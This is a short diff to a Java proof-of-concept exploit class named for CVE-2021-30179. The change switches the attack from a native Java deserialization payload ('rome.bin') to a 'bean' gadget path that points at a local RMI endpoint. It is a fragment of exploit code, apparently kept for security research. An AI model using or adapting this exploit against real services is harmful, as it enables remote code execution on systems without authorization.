@@ -50,10 +50,10 @@ public class CVE_2021_30179 {
         out.writeUTF("sayHello");
         out.writeObject(new String[]{"java.lang.String"});
 
-        String url = "rmi://127.0.0.1:1099/tn3x0r";
-//        bean(out, url);
+        String url = "rmi://127.0.0.1:1099/sbm9gt";
+        bean(out, url);
 //        rawReturn(out, url);
-        nativeJava(out, "rome.bin");
+//        nativeJava(out, "rome.bin");
 
         out.flushBuffer();
 
